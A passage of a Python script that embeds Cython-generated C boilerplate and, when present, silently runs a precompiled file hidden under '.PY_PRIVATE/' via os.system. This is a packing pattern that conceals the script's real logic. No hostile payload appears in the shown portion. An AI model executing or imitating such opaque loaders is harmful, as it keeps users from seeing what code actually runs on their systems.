
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250511114552630"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
